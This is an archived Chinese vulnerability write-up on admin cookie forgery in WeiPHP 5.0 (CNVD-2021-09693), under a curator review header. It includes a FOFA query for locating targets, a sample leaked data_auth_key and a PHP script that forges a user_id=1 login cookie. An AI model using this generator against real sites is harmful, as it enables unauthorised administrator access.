---
cnvd: "CNVD-2021-09693"

source: "MrWQ/vulnerability-paper"
product: "WeiPHP / 自定义自动登录"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-2021-09693"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "Weiphp5-0 任意用户 Cookie 伪造 CNVD-2021-09693"
prerequisites: "来源所述条件，未列明部分仍待核：<=5.0，需泄露data_auth_key；任意UID权限由实际记录决定"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/aklOSIWUJ2Bzmqwjj845TA"
id: "vw-355ed45e5abdb4f95c9c057d"
entity_id: "ve-b03d9433daff0c8fc52fb892"
schema_version: "1"
canonical: "Web安全/开发框架/WeiPHP/WeiPHP5.0-任意用户Cookie伪造-CNVD-2021-09693.md"
relation_type: "duplicate_of"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;=5.0，需泄露data_auth_key；任意UID权限由实际记录决定

代码与实验材料：全文加解密及生成器与595一致，图片为原微信资源

来源证据范围：PeiQi文库署名和原文链接，归属优于595

- **适用与权限边界（1）**：前序密钥依赖和固定实验值需要模板化；依据：“任意用户”不是无密钥绕过，样例key不应当默认密码，UID1假定需说明。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（2）**：缺精确版本及修复；依据：只&lt;=5.0，来源未直链CNVD或patch。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **来源与引用处置（3）**：粗体转码和宣传混入；依据：多层**未平衡，文库推广占尾部。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Weiphp5-0 任意用户 Cookie 伪造 CNVD-2021-09693

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aklOSIWUJ2Bzmqwjj845TA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**Weiphp5.0 存在管理员用户 Cookie 伪造，通过泄露的密钥数据，可利用加密方法来得到管理员的 Cookie**

**二:  漏洞影响🐇**

**Weiphp <= 5.0**

**三:  漏洞复现🐋**

```
FOFA: app="WeiPHP"
```

**首先需要得到数据库配置文件中的 **data_auth_key** 密钥**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7BOfhicicJoxHr1usVqItYugCeSoMkmdS02ZGR4ibZHyeiaicgLZEXVGYb7tphKqSTIeZ5QZict9hibTYaw/640?wx_fmt=png)

**得到这个配置文件可参照上一篇 **Weiphp5.0 前台文件任意读取****

```
'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T'
```

**全局查找下使用了这个密钥的地方**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7BOfhicicJoxHr1usVqItYugKibxB8mXxfKIDjbmQ0rGiaHCImUvmGibibPDDdm7nyztjr36wB4JAIJkNQ/640?wx_fmt=png)

**找到了跟据这个密钥的加密方法和解密方法**

****加密方法 think_encrypt****

```
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i < $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}
```

**解密方法 think_decrypt**

```
function think_decrypt($data, $key = '')
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);
    $data = str_replace(array(
        '-',
        '_'
    ), array(
        '+',
        '/'
    ), $data);
    $mod4 = strlen($data) % 4;
    if ($mod4) {
        $data .= substr('====', $mod4);
    }
    $data = base64_decode($data);
    $expire = substr($data, 0, 10);
    $data = substr($data, 10);

    if ($expire > 0 && $expire < time()) {
        return '';
    }
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return base64_decode($str);
}
```

**全局查看下使用了解密方法的地方**

**在文件 **application\common.php** 中含有使用解密方法的代码，用于做身份验证**

```
function is_login()
{
    $user = session('user_auth');
    if (empty($user)) {
        $cookie_uid = cookie('user_id');
        if (!empty($cookie_uid)) {
            $uid = think_decrypt($cookie_uid);
            $userinfo = getUserInfo($uid);
            D('common/User')->autoLogin($userinfo);

            $user = session('user_auth');
        }
    }
    if (empty($user)) {
        return 0;
    } else {
        return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
    }
}
```

**根据这里得到的代码，可以知道当 **user_Id=1** 时, 会解密密钥后判断是否正确，如果正确则可以登录系统**

**我们在本地使用加密代码加密 **user_id=1** 得到的 cookie 则可以登录系统**

```
<?php
show_source(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T';
    $key = md5($key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i < $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo 'user_id = ' . think_encrypt($_GET['user_id']);
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7BOfhicicJoxHr1usVqItYugFwwO0qwD86gZibiaMftoVGqa3RGg3hBic4uicBMiaibdSf1jIYmibEQic6xUeQ/640?wx_fmt=png)

**添加 **cookie: user_id=xxxxxxxx** 即可成功登录**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7BOfhicicJoxHr1usVqItYugmDaphJAdPU6RkJL5tws0fXfgwdKETOLNvfbTribZkU3VqkFTURngH4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7BOfhicicJoxHr1usVqItYugPe4ar27laRN5jAaA4UgPqQHmvENydk4f9S7GqkNy8SILJEEZoJoESA/640?wx_fmt=png)

**获取密钥的方法参照公众号上一篇 Weiphp5.0 审计文章**  

 ****四:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
